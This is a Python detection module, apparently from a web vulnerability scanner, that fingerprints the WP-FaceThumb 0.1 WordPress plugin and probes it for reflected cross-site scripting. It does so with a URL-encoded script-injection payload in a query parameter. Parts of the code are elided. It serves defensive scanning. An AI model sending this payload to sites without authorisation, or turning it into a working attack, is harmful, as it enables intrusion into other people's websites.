#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in index."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP-FaceThumb 0.1 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'packetstorm', 'wordpress', 'xss', 'wp-plugin', 'mnt-tech', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        path = '/wp-content/plugins/wp-facethumb/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('WP-FaceThumb ===',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/?page_id=1&pagination_wp_facethumb=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WP-FaceThumb 0.1 - Cross-Site Scripting detected', path=path)
            return True
        return False
